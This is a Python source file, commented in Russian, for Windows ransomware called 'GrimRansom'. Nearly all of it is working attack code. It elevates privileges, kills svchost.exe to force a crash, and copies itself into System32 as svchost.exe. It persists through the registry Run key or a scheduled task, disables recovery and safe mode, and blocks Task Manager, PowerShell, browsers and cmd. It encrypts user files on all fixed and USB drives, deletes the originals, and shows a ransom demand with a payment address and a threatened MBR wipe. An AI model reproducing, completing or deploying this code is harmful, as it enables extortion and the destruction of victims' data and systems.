import os
import time
import shutil
import tkinter as tk
from tkinter import messagebox, ttk
from concurrent.futures import ThreadPoolExecutor
import ctypes
import winreg
import sys
import win32gui
import win32api
import win32con
import win32process
import win32file
import threading
import logging
import winerror
import subprocess
import win32com.client
try:
    import psutil
except ModuleNotFoundError:
    print("Ошибка: Установи psutil командой 'pip install psutil'")
    sys.exit(1)
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Hash import SHA256
except ModuleNotFoundError:
    print("Ошибка: Установи pycryptodome командой 'pip install pycryptodome'")
    sys.exit(1)
try:
    from win32com.shell import shell
except ModuleNotFoundError:
    print("Ошибка: Установи pywin32 командой 'pip install pywin32'")
    sys.exit(1)
# Настройка логирования
logging.basicConfig(
    filename="ransomware_log.txt",
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
# Конфигурация
CONFIG = {
    "PASSWORD": "yellow_215",
    "TARGET_EXTENSIONS": [".pdf", ".txt", ".doc", ".docx", ".jpg", ".png", ".mp4",
                         ".xlsx", ".pptx", ".zip", ".bmp", ".7z", ".rar"],
    "EXCLUDED_DIRS": ["ProgramData", "Program Files", "Windows", "Windows.old"],
    "WALLPAPER_PATH": os.path.abspath("ware.png"),
    "RANSOM_MESSAGE": """
Your computer and all drives (including USB) are blocked by GrimRansom virus! All your files are encrypted and inaccessible.
To regain access, transfer $600 to the following address: 1F4kE9mP2vX7nY8zW3qL6tR9uJ5hK2mN8.
WARNING: Any attempts to bypass GrimRansom will result in permanent data destruction!
Using Task Manager, CMD, REGEDIT, PowerShell, Group Policy Editor or other bypass tools is prohibited.
You have 48 hours. Ignoring this message = permanent data loss.
""",
    "MAX_FILE_SIZE": 100_000_000,  # 100 МБ
    "TIMER_DURATION": 48 * 3600,  # 48 часов
    "MAX_ATTEMPTS": 20  # Максимум попыток ввода пароля
}
# Проверка прав администратора
def is_admin():
    try:
        logging.debug("Проверка прав администратора")
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        logging.error(f"Ошибка проверки прав администратора: {e}")
        print(f"Ошибка проверки прав администратора: {e}")
        return False
# Перезапуск с правами администратора
def run_as_admin():
    if not is_admin():
        logging.info("Перезапуск с правами администратора...")
        print("Перезапуск с правами администратора...")
        try:
            script_path = os.path.abspath(sys.argv[0])
            if not os.path.exists(script_path):
                logging.error(f"Файл скрипта не найден: {script_path}")
                print(f"Файл скрипта не найден: {script_path}")
                sys.exit(1)
            result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script_path}"', None, 1)
            if result <= 32:
                logging.error(f"Ошибка ShellExecuteW, код: {result}")
                print(f"Ошибка при запросе прав администратора, код: {result}")
                sys.exit(1)
            logging.info("Запрос на повышение прав отправлен")
            sys.exit(0)
        except Exception as e:
            logging.error(f"Ошибка при перезапуске: {e}")
            print(f"Ошибка при перезапуске: {e}")
            sys.exit(1)
    else:
        logging.info("Программа запущена с правами администратора")
        print("Программа запущена с правами администратора")
# Получение привилегий SeDebugPrivilege
def enable_debug_privilege():
    try:
        hToken = ctypes.c_void_p()
        ctypes.windll.advapi32.OpenProcessToken(ctypes.windll.kernel32.GetCurrentProcess(),
                                               win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY,
                                               ctypes.byref(hToken))
        luid = ctypes.c_void_p()
        ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid))
        
        class LUID_AND_ATTRIBUTES(ctypes.Structure):
            *fields* = [("Luid", ctypes.c_void_p), ("Attributes", ctypes.c_uint32)]
        
        class TOKEN_PRIVILEGES(ctypes.Structure):
            *fields* = [("PrivilegeCount", ctypes.c_uint32), ("Privileges", LUID_AND_ATTRIBUTES)]
        
        token_privs = TOKEN_PRIVILEGES()
        token_privs.PrivilegeCount = 1
        token_privs.Privileges.Luid = luid
        token_privs.Privileges.Attributes = win32con.SE_PRIVILEGE_ENABLED
        
        ctypes.windll.advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(token_privs),
                                                    ctypes.sizeof(token_privs), None, None)
        ctypes.windll.kernel32.CloseHandle(hToken)
        logging.info("SeDebugPrivilege успешно включён")
        print("SeDebugPrivilege успешно включён")
        return True
    except Exception as e:
        logging.error(f"Ошибка при получении SeDebugPrivilege: {e}")
        print(f"Ошибка при получении SeDebugPrivilege: {e}")
        return False
# Завершение svchost.exe для вызова BSOD
def cause_bsod():
    try:
        if enable_debug_privilege():
            for proc in psutil.process_iter(['name', 'pid']):
                if proc.info['name'].lower() == 'svchost.exe':
                    handle = win32api.OpenProcess(win32con.PROCESS_TERMINATE, False, proc.info['pid'])
                    win32api.TerminateProcess(handle, 1)
                    win32api.CloseHandle(handle)
                    logging.info(f"Завершён svchost.exe (PID: {proc.info['pid']})")
                    print(f"Завершён svchost.exe (PID: {proc.info['pid']})")
                    break
        else:
            logging.error("Не удалось получить SeDebugPrivilege для BSOD")
            print("Не удалось получить SeDebugPrivilege для BSOD")
    except Exception as e:
        logging.error(f"Ошибка при вызове BSOD: {e}")
        print(f"Ошибка при вызове BSOD: {e}")
# Маскировка под системный процесс
def mask_as_system_process():
    try:
        hToken = ctypes.c_void_p()
        ctypes.windll.advapi32.OpenProcessToken(ctypes.windll.kernel32.GetCurrentProcess(),
                                               win32con.TOKEN_ADJUST_SESSIONID | win32con.TOKEN_QUERY,
                                               ctypes.byref(hToken))
        ctypes.windll.advapi32.SetTokenInformation(hToken, 3, ctypes.byref(ctypes.c_uint32(0)), 4)  # SessionId = 0
        ctypes.windll.kernel32.CloseHandle(hToken)
        logging.info("Процесс замаскирован под системный")
        print("Процесс замаскирован под системный")
        return True
    except Exception as e:
        logging.error(f"Ошибка маскировки процесса: {e}")
        print(f"Ошибка маскировки процесса: {e}")
        return False
# Добавление в автозагрузку
def add_to_startup():
    try:
        system32_path = os.path.join(os.environ["SystemRoot"], "System32", "svchost.exe")
        current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(**file**)
        
        # Проверка существования исходного файла
        if not os.path.exists(current_path):
            logging.error(f"Исходный файл не найден: {current_path}")
            print(f"Исходный файл не найден: {current_path}")
            return False
        
        # Копирование в C:\Windows\System32
        if not os.path.exists(system32_path):
            shutil.copy(current_path, system32_path)
            logging.info(f"Скопирован файл в {system32_path}")
            print(f"Скопирован файл в {system32_path}")
        
        # Попытка добавить в реестр (HKLM)
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                r"Software\Microsoft\Windows\CurrentVersion\Run",
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsService", 0, winreg.REG_SZ, system32_path)
            winreg.CloseKey(key)
            logging.info("Добавлено в автозагрузку через реестр HKLM")
            print("Добавлено в автозагрузку через реестр HKLM")
            return True
        except WindowsError as e:
            logging.error(f"Ошибка добавления в реестр HKLM: {e}, код ошибки: {e.winerror}")
            print(f"Ошибка добавления в реестр HKLM: {e}, код ошибки: {e.winerror}")
            
            # Резервный метод: Task Scheduler
            try:
                subprocess.run([
                    "schtasks", "/create", "/sc", "ONLOGON", "/tn", "WindowsService",
                    "/tr", f'"{system32_path}"', "/rl", "HIGHEST", "/f"
                ], check=True, capture_output=True)
                logging.info("Добавлено в автозагрузку через Task Scheduler")
                print("Добавлено в автозагрузку через Task Scheduler")
                return True
            except subprocess.CalledProcessError as e:
                logging.error(f"Ошибка Task Scheduler: {e}, вывод: {e.stderr.decode('cp1251', errors='replace')}")
                print(f"Ошибка Task Scheduler: {e}, вывод: {e.stderr.decode('cp1251', errors='replace')}")
                return False
    except Exception as e:
        logging.error(f"Общая ошибка автозагрузки: {e}")
        print(f"Общая ошибка автозагрузки: {e}")
        return False
# Проверка автозагрузки
def check_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_READ)
        value, _ = winreg.QueryValueEx(key, "WindowsService")
        winreg.CloseKey(key)
        expected_path = os.path.join(os.environ["SystemRoot"], "System32", "svchost.exe")
        logging.debug(f"Проверка автозагрузки в реестре: {value} == {expected_path}")
        if value == expected_path:
            return True
    except WindowsError as e:
        logging.error(f"Ошибка проверки реестра: {e}, код ошибки: {e.winerror}")
    # Проверка Task Scheduler
    try:
        result = subprocess.run(["schtasks", "/query", "/tn", "WindowsService"],
                              capture_output=True, text=True, encoding='cp1251')
        if result.returncode == 0:
            logging.debug("Автозагрузка найдена в Task Scheduler")
            return True
        return False
    except subprocess.CalledProcessError as e:
        logging.error(f"Ошибка проверки Task Scheduler: {e}, вывод: {e.stderr}")
        return False
# Блокировка безопасного режима
def disable_safe_mode():
    try:
        result = subprocess.run(["bcdedit", "/set", "{default}", "safeboot", "minimal"],
                      check=True, capture_output=True)
        logging.info("Безопасный режим заблокирован через bcdedit")
        print("Безопасный режим заблокирован через bcdedit")
        return True
    except subprocess.CalledProcessError as e:
        logging.error(f"Ошибка блокировки безопасного режима: {e}, вывод: {e.stderr.decode('cp1251', errors='replace')}")
        print(f"Ошибка блокировки безопасного режима: {e}, вывод: {e.stderr.decode('cp1251', errors='replace')}")
        return False
# Блокировка режима восстановления (WinRE)
def disable_winre():
    try:
        result = subprocess.run(["reagentc", "/disable"], check=True, capture_output=True)
        logging.info("WinRE отключён")
        print("WinRE отключён")
        return True
    except subprocess.CalledProcessError as e:
        logging.error(f"Ошибка отключения WinRE: {e}, вывод: {e.stderr.decode('cp1251', errors='replace')}")
        print(f"Ошибка отключения WinRE: {e}, вывод: {e.stderr.decode('cp1251', errors='replace')}")
        return False
# Блокировка PowerShell
def disable_powershell():
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
                              r"Software\Policies\Microsoft\Windows\PowerShell")
        winreg.SetValueEx(key, "EnableScripts", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(key, "ExecutionPolicy", 0, winreg.REG_SZ, "Restricted")
        winreg.CloseKey(key)
        logging.info("PowerShell заблокирован через реестр")
        print("PowerShell заблокирован через реестр")
        return True
    except WindowsError as e:
        logging.error(f"Ошибка блокировки PowerShell: {e}, код ошибки: {e.winerror}")
        print(f"Ошибка блокировки PowerShell: {e}, код ошибки: {e.winerror}")
        return False
# Блокировка taskkill
def disable_taskkill():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                              r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
        winreg.SetValueEx(key, "DisallowRun", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                              r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun")
        winreg.SetValueEx(key, "1", 0, winreg.REG_SZ, "taskkill.exe")
        winreg.CloseKey(key)
        logging.info("Taskkill заблокирован")
        print("Taskkill заблокирован")
        return True
    except WindowsError as e:
        logging.error(f"Ошибка блокировки taskkill: {e}, код ошибки: {e.winerror}")
        print(f"Ошибка блокировки taskkill: {e}, код ошибки: {e.winerror}")
        return False
# Блокировка редактора групповых политик
def disable_gpedit():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                              r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableGPEdit", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        logging.info("Редактор групповых политик заблокирован")
        print("Редактор групповых политик заблокирован")
        return True
    except WindowsError as e:
        logging.error(f"Ошибка блокировки gpedit: {e}, код ошибки: {e.winerror}")
        print(f"Ошибка блокировки gpedit: {e}, код ошибки: {e.winerror}")
        return False
# Мониторинг запрещённых процессов
def monitor_protection():
    current_pid = os.getpid()
    logging.info(f"Запущен мониторинг защиты, PID: {current_pid}")
    print(f"Запущен мониторинг защиты, PID: {current_pid}")
    system_processes = ['explorer.exe', 'winlogon.exe', 'csrss.exe', 'smss.exe', 'svchost.exe']
    forbidden_processes = [
        'taskmgr.exe', 'regedit.exe', 'cmd.exe', 'powershell.exe', 'pwsh.exe',
        'chrome.exe', 'firefox.exe', 'msedge.exe', 'opera.exe', 'safari.exe',
        'iexplore.exe', 'yandex.exe', 'gpedit.msc', 'taskkill.exe'
    ]
    
    while True:
        try:
            # Проверка автозагрузки
            if not check_startup():
                logging.warning("Обнаружено удаление автозагрузки, восстанавливаю...")
                print("Обнаружено удаление автозагрузки, восстанавливаю...")
                add_to_startup()
                cause_bsod()
            
            # Проверка всех процессов
            for proc in psutil.process_iter(['pid', 'name']):
                proc_name = proc.info['name'].lower()
                if proc_name not in system_processes and (proc_name in forbidden_processes or has_gui(proc.info['pid'])):
                    logging.warning(f"Обнаружен запрещённый процесс {proc_name}, завершаю svchost.exe...")
                    print(f"Обнаружен запрещённый процесс {proc_name}, завершаю svchost.exe...")
                    cause_bsod()
                    return  # Прерываем цикл после попытки BSOD
        except Exception as e:
            logging.error(f"Ошибка в мониторинге: {e}")
            print(f"Ошибка в мониторинге: {e}")
        time.sleep(1)
# Блокировка диспетчера задач
def disable_task_manager():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        logging.info("Диспетчер задач заблокирован")
        print("Диспетчер задач заблокирован")
        return True
    except WindowsError as e:
        logging.error(f"Ошибка при блокировке диспетчера задач: {e}, код ошибки: {e.winerror}")
        print(f"Ошибка при блокировке диспетчера задач: {e}, код ошибки: {e.winerror}")
        return False
# Блокировка приложений
def block_applications():
    try:
        apps_to_block = [
            "chrome.exe", "firefox.exe", "msedge.exe", "opera.exe",
            "safari.exe", "iexplore.exe", "cmd.exe", "regedit.exe",
            "powershell.exe", "pwsh.exe", "gpedit.msc", "taskkill.exe",
            "yandex.exe"
        ]
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
        winreg.SetValueEx(key, "DisallowRun", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun")
        for i, app in enumerate(apps_to_block, 1):
            winreg.SetValueEx(key, str(i), 0, winreg.REG_SZ, app)
        winreg.CloseKey(key)
        logging.info("Приложения заблокированы")
        print("Приложения заблокированы")
        return True
    except WindowsError as e:
        logging.error(f"Ошибка при блокировке приложений: {e}, код ошибки: {e.winerror}")
        print(f"Ошибка при блокировке приложений: {e}, код ошибки: {e.winerror}")
        return False
# Проверка, имеет ли процесс GUI
def has_gui(pid):
    try:
        def enum_window_callback(hwnd, pids):
            _, window_pid = win32gui.GetWindowThreadProcessId(hwnd)
            if window_pid == pid and win32gui.IsWindowVisible(hwnd):
                pids.append(hwnd)
        
        pids = []
        win32gui.EnumWindows(enum_window_callback, pids)
        return len(pids) > 0
    except Exception as e:
        logging.error(f"Ошибка проверки GUI процесса: {e}")
        return False
# Завершение сторонних GUI-программ
def kill_gui_processes():
    success = False
    system_processes = ['explorer.exe', 'winlogon.exe', 'csrss.exe', 'smss.exe', 'svchost.exe']
    for proc in psutil.process_iter(['name', 'pid']):
        try:
            proc_name = proc.info['name'].lower()
            if proc_name in system_processes:
                continue
            if has_gui(proc.info['pid']):
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                    logging.info(f"GUI процесс {proc_name} завершен")
                    print(f"GUI процесс {proc_name} завершен")
                    success = True
                except psutil.TimeoutExpired:
                    logging.warning(f"Повторная попытка завершения {proc_name}...")
                    print(f"Повторная попытка завершения {proc_name}...")
                    try:
                        proc.kill()
                        logging.info(f"GUI процесс {proc_name} принудительно завершен")
                        print(f"GUI процесс {proc_name} принудительно завершен")
                        success = True
                    except Exception as e:
                        logging.error(f"Не удалось завершить процесс {proc_name}: {e}")
                        print(f"Не удалось завершить процесс {proc_name}: {e}")
                        continue
                except Exception as e:
                    logging.error(f"Ошибка при завершении процесса {proc_name}: {e}")
                    print(f"Ошибка при завершении процесса {proc_name}: {e}")
                    continue
        except psutil.NoSuchProcess:
            continue
    return success
# Получение списка всех дисков
def get_all_drives():
    drives = []
    for partition in psutil.disk_partitions():
        drive = partition.mountpoint
        drive_type = win32file.GetDriveType(drive)
        drive_name = partition.device
        if drive_type in [win32file.DRIVE_FIXED, win32file.DRIVE_REMOVABLE]:
            drives.append((drive, drive_type == win32file.DRIVE_REMOVABLE))
            logging.info(f"Найден диск: {drive_name} (Тип: {'USB' if drive_type == win32file.DRIVE_REMOVABLE else 'Локальный'})")
            print(f"Найден диск: {drive_name} (Тип: {'USB' if drive_type == win32file.DRIVE_REMOVABLE else 'Локальный'})")
    return drives
# Генерация ключа из пароля
def get_key(password):
    return SHA256.new(password.encode()).digest()
# Шифрование файла
def encrypt_file(file_path, key):
    if os.path.basename(file_path) == "ware.png" or os.path.basename(file_path) == "svchost.exe":
        return False
    try:
        if os.path.getsize(file_path) > CONFIG["MAX_FILE_SIZE"]:
            logging.info(f"Пропущен файл {file_path}: слишком большой")
            return False
        with open(file_path, "rb") as f:
            data = f.read()
        cipher = AES.new(key, AES.MODE_CBC)
        iv = cipher.iv
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
        with open(file_path + ".encrypted", "wb") as f:
            f.write(iv + encrypted_data)
        os.remove(file_path)
        logging.info(f"Зашифрован файл: {file_path}")
        print(f"Зашифрован файл: {file_path}")
        return True
    except Exception as e:
        logging.error(f"Ошибка шифрования {file_path}: {e}")
        print(f"Ошибка шифрования {file_path}: {e}")
        return False
# Расшифровка файла
def decrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        iv = data[:16]
        encrypted_data = data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        original_path = file_path.replace(".encrypted", "")
        with open(original_path, "wb") as f:
            f.write(decrypted_data)
        os.remove(file_path)
        logging.info(f"Расшифрован файл: {file_path}")
        print(f"Расшифрован файл: {file_path}")
        return True
    except Exception as e:
        logging.error(f"Ошибка расшифровки {file_path}: {e}")
        print(f"Ошибка расшифровки {file_path}: {e}")
        return False
# Сканирование и шифрование всех файлов на всех дисках
def encrypt_all_files(update_progress_callback):
    encrypted_files = []
    key = get_key(CONFIG["PASSWORD"])
    target_files = []
    
    # Получение всех дисков
    drives = get_all_drives()
    for drive, is_usb in drives:
        logging.info(f"Сканирование диска {drive} {'(USB)' if is_usb else ''}")
        print(f"Сканирование диска {drive} {'(USB)' if is_usb else ''}")
        try:
            for root, _, files in os.walk(drive):
                if any(excluded_dir in root for excluded_dir in CONFIG["EXCLUDED_DIRS"]):
                    continue
                for file in files:
                    if any(file.endswith(ext) for ext in CONFIG["TARGET_EXTENSIONS"]):
                        file_path = os.path.join(root, file)
                        target_files.append(file_path)
        except Exception as e:
            logging.error(f"Ошибка сканирования диска {drive}: {e}")
            print(f"Ошибка сканирования диска {drive}: {e}")
    
    total_files = len(target_files)
    processed_files = 0
    logging.info(f"Найдено {total_files} файлов для шифрования")
    print(f"Найдено {total_files} файлов для шифрования")
    
    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(encrypt_file, file_path, key) for file_path in target_files]
        for future in futures:
            if future.result():
                encrypted_files.append(file_path)
            processed_files += 1
            update_progress_callback(processed_files, total_files)
    
    logging.info(f"Зашифровано {len(encrypted_files)} файлов")
    print(f"Зашифровано {len(encrypted_files)} файлов")
    return encrypted_files
# Расшифровка всех файлов на всех дисках
def decrypt_all_files(password, update_progress_callback):
    decrypted_files = []
    key = get_key(password)
    target_files = []
    
    drives = get_all_drives()
    for drive, is_usb in drives:
        logging.info(f"Сканирование диска {drive} {'(USB)' if is_usb else ''} для расшифровки")
        print(f"Сканирование диска {drive} {'(USB)' if is_usb else ''} для расшифровки")
        try:
            for root, _, files in os.walk(drive):
                if any(excluded_dir in root for excluded_dir in CONFIG["EXCLUDED_DIRS"]):
                    continue
                for file in files:
                    if file.endswith(".encrypted"):
                        file_path = os.path.join(root, file)
                        target_files.append(file_path)
        except Exception as e:
            logging.error(f"Ошибка сканирования диска {drive} для расшифровки: {e}")
            print(f"Ошибка сканирования диска {drive} для расшифровки: {e}")
    
    total_files = len(target_files)
    processed_files = 0
    logging.info(f"Найдено {total_files} файлов для расшифровки")
    print(f"Найдено {total_files} файлов для расшифровки")
    
    with ThreadPoolExecutor() as executor:
        futures = [executor.submit(decrypt_file, file_path, key) for file_path in target_files]
        for future in futures:
            if future.result():
                decrypted_files.append(file_path)
            processed_files += 1
            update_progress_callback(processed_files, total_files)
    
    logging.info(f"Расшифровано {len(decrypted_files)} файлов")
    print(f"Расшифровано {len(decrypted_files)} файлов")
    return decrypted_files
# Установка обоев
def set_wallpaper():
    try:
        wallpaper_path = CONFIG["WALLPAPER_PATH"]
        if os.path.exists(wallpaper_path):
            win32gui.SystemParametersInfo(
                win32con.SPI_SETDESKWALLPAPER,
                wallpaper_path,
                win32con.SPIF_UPDATEINIFILE | win32con.SPIF_SENDWININICHANGE
            )
            logging.info("Обои установлены")
            print("Обои установлены")
        else:
            logging.error(f"Файл обоев не найден: {wallpaper_path}")
            print(f"Файл обоев не найден: {wallpaper_path}")
    except Exception as e:
        logging.error(f"Ошибка установки обоев: {e}")
        print(f"Ошибка установки обоев: {e}")
# Интерфейс в стиле WannaCry
class RansomWindow:
    def **init**(self, root):
        self.root = root
        self.attempts_left = CONFIG["MAX_ATTEMPTS"]
        self.root.overrideredirect(True)
        self.root.configure(bg="#000000")
        
        window_width = 1000
        window_height = 800
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        self.root.geometry(f"{window_width}x{window_height}+{x}+{y}")
        try:
            self.root.iconbitmap("ransom.ico")
        except Exception as e:
            logging.error(f"Ошибка установки иконки: {e}")
        self.drag_start_x = 0
        self.drag_start_y = 0
        self.root.bind("<Button-1>", self.start_drag)
        self.root.bind("<B1-Motion>", self.on_drag)
        self.canvas = tk.Canvas(self.root, bg="#000000", highlightthickness=0)
        self.canvas.pack(expand=True, fill="both")
        self.create_gradient()
        self.main_frame = tk.Frame(self.canvas, bg="#1A1A1A", bd=5, relief="ridge")
        self.main_frame.pack(expand=True, fill="both", padx=30, pady=30)
        self.title_label = tk.Label(
            self.main_frame,
            text="GrimRansom",
            font=("Impact", 40, "bold"),
            fg="#FF0000",
            bg="#1A1A1A",
            highlightthickness=3,
            highlightbackground="#AA0000",
            relief="flat"
        )
        self.title_label.pack(pady=15)
        self.animate_title()
        self.danger_label = tk.Label(
            self.main_frame,
            text="DANGER! ALL DRIVES ENCRYPTED!",
            font=("OCR-A", 20, "bold"),
            fg="#FF5555",
            bg="#1A1A1A"
        )
        self.danger_label.pack(pady=10)
        self.animate_danger()
        self.message_label = tk.Label(
            self.main_frame,
            text=CONFIG["RANSOM_MESSAGE"],
            font=("Courier New", 12),
            fg="#FFFFFF",
            bg="#1A1A1A",
            justify="left",
            wraplength=900,
            relief="flat",
            bd=2,
            highlightthickness=2,
            highlightbackground="#AA0000"
        )
        self.message_label.pack(pady=10)
        self.timer_label = tk.Label(
            self.main_frame,
            text="",
            font=("Arial", 24, "bold"),
            fg="#00FF00",
            bg="#1A1A1A",
            relief="flat"
        )
        self.timer_label.pack(pady=10)
        self.start_time = time.time()
        self.time_left = CONFIG["TIMER_DURATION"]
        self.update_timer()
        self.progress_frame = tk.Frame(self.main_frame, bg="#1A1A1A")
        self.progress_frame.pack(pady=10)
        self.progress_label = tk.Label(
            self.progress_frame,
            text="Progress: 0%",
            font=("Arial", 12),
            fg="#FFFFFF",
            bg="#1A1A1A"
        )
        self.progress_label.pack()
        self.progress_bar = ttk.Progressbar(
            self.progress_frame,
            length=500,
            mode="determinate",
            style="Custom.Horizontal.TProgressbar"
        )
        self.progress_bar.pack(pady=10)
        style = ttk.Style()
        style.configure("Custom.Horizontal.TProgressbar", troughcolor="#333333", background="#FF0000")
        self.password_frame = tk.Frame(self.main_frame, bg="#1A1A1A")
        self.password_frame.pack(pady=10, fill="x", padx=100)
        self.password_label = tk.Label(
            self.password_frame,
            text="Enter decryption password:",
            font=("Arial", 12),
            fg="#FFFFFF",
            bg="#1A1A1A"
        )
        self.password_label.pack(pady=5)
        self.password_entry = tk.Entry(
            self.password_frame,
            font=("Arial", 14),
            show="*",
            width=50,
            bg="#333333",
            fg="#FFFFFF",
            insertbackground="#FFFFFF",
            relief="flat",
            bd=2,
            highlightthickness=2,
            highlightbackground="#FF5555"
        )
        self.password_entry.pack(pady=10, padx=50, fill="x")
        logging.info("Поле ввода пароля создано")
        print("Поле ввода пароля создано")
        self.password_entry.bind("<Return>", lambda event: self.check_password())
        self.decrypt_button = tk.Button(
            self.password_frame,
            text="DECRYPT",
            command=self.check_password,
            font=("Arial", 14, "bold"),
            bg="#FF0000",
            fg="#FFFFFF",
            activebackground="#AA0000",
            relief="raised",
            bd=4,
            width=12,
            highlightthickness=2,
            highlightbackground="#FFFFFF"
        )
        self.decrypt_button.pack(pady=10)
        self.animate_button()
        self.attempts_label = tk.Label(
            self.main_frame,
            text=f"Attempts left: {self.attempts_left}",
            font=("Arial", 12),
            fg="#FFFF00",
            bg="#1A1A1A"
        )
        self.attempts_label.pack(pady=10)
    def create_gradient(self):
        width = 1000
        height = 650
        for y in range(height):
            r = int(20 + (y / height) * (90 - 20))
            g = int(10 + (y / height) * (20 - 10))
            b = int(10 + (y / height) * (20 - 10))
            color = f"#{r:02x}{g:02x}{b:02x}"
            self.canvas.create_line(0, y, width, y, fill=color)
    def animate_title(self):
        current_color = self.title_label.cget("fg")
        new_color = "#FF5555" if current_color == "#FF0000" else "#FF0000"
        self.title_label.config(fg=new_color)
        self.root.after(300, self.animate_title)
    def animate_danger(self):
        current_color = self.danger_label.cget("fg")
        new_color = "#FF5555" if current_color == "#FF0000" else "#FF0000"
        self.danger_label.config(fg=new_color)
        self.root.after(400, self.animate_danger)
    def animate_button(self):
        current_bg = self.decrypt_button.cget("bg")
        new_bg = "#AA0000" if current_bg == "#FF0000" else "#FF0000"
        self.decrypt_button.config(bg=new_bg)
        self.root.after(600, self.animate_button)
    def start_drag(self, event):
        self.drag_start_x = event.x_root - self.root.winfo_x()
        self.drag_start_y = event.y_root - self.root.winfo_y()
    def on_drag(self, event):
        x = event.x_root - self.drag_start_x
        y = event.y_root - self.drag_start_y
        self.root.geometry(f"+{x}+{y}")
    def update_timer(self):
        elapsed = time.time() - self.start_time
        remaining = max(0, self.time_left - elapsed)
        if remaining <= 0:
            self.show_timeout_message()
            return
        hours = int(remaining // 3600)
        minutes = int((remaining % 3600) // 60)
        seconds = int(remaining % 60)
        self.timer_label.config(text=f"TIME LEFT: {hours:02d}:{minutes:02d}:{seconds:02d}")
        current_color = self.timer_label.cget("fg")
        new_color = "#00FF00" if current_color == "#00CC00" else "#00CC00"
        self.timer_label.config(fg=new_color)
        self.root.after(1000, self.update_timer)
    def show_timeout_message(self):
        timeout_window = tk.Toplevel(self.root)
        timeout_window.overrideredirect(True)
        timeout_window.configure(bg="#000000")
        timeout_window.geometry("500x300+450+250")
        frame = tk.Frame(timeout_window, bg="#000000", bd=5, relief="ridge")
        frame.pack(expand=True, fill="both", padx=10, pady=10)
        warning_label = tk.Label(
            frame,
            text="Time's up. Wiping MBR...",
            font=("Impact", 30, "bold"),
            fg="#FF0000",
            bg="#000000"
        )
        warning_label.pack(pady=20)
        def blink_warning():
            current_color = warning_label.cget("fg")
            new_color = "#FF5555" if current_color == "#FF0000" else "#FF0000"
            warning_label.config(fg=new_color)
            timeout_window.after(500, blink_warning)
        blink_warning()
        tk.Button(
            frame,
            text="OK",
            command=timeout_window.destroy,
            font=("Arial", 12, "bold"),
            bg="#FF0000",
            fg="#FFFFFF",
            width=10
        ).pack(pady=20)
    def update_progress(self, processed, total):
        if total > 0:
            percentage = (processed / total) * 100
            self.progress_bar["value"] = percentage
            self.progress_label.config(text=f"Progress: {int(percentage)}%")
            self.root.update()
    def check_password(self):
        if self.attempts_left <= 0:
            messagebox.showerror("Error", "No attempts left! Your files remain encrypted.")
            return
        
        entered_password = self.password_entry.get()
        if entered_password == CONFIG["PASSWORD"]:
            decrypt_window = tk.Toplevel(self.root)
            decrypt_window.overrideredirect(True)
            decrypt_window.configure(bg="#000000")
            decrypt_window.geometry("400x150+500+300")
            frame = tk.Frame(decrypt_window, bg="#000000", bd=5, relief="ridge")
            frame.pack(expand=True, fill="both", padx=5, pady=5)
            tk.Label(
                frame,
                text="Decrypting files, please wait...",
                font=("Arial", 14),
                fg="#FFFFFF",
                bg="#000000"
            ).pack(pady=20)
            decrypt_window.update()
            
            decrypted_files = decrypt_all_files(entered_password, self.update_progress)
            
            decrypt_window.destroy()
            success_window = tk.Toplevel(self.root)
            success_window.overrideredirect(True)
            success_window.configure(bg="#000000")
            success_window.geometry("400x200+500+300")
            frame = tk.Frame(success_window, bg="#000000", bd=5, relief="ridge")
            frame.pack(expand=True, fill="both", padx=5, pady=5)
            tk.Label(
                frame,
                text="Success!",
                font=("Impact", 24),
                fg="#00FF00",
                bg="#000000"
            ).pack(pady=10)
            tk.Label(
                frame,
                text=f"Decrypted {len(decrypted_files)} files!\nSystem will now return to normal.",
                font=("Arial", 12),
                fg="#FFFFFF",
                bg="#000000",
                wraplength=350
            ).pack(pady=10)
            tk.Button(
                frame,
                text="OK",
                command=self.root.destroy,
                font=("Arial", 12, "bold"),
                bg="#FF0000",
                fg="#FFFFFF",
                width=10
            ).pack(pady=10)
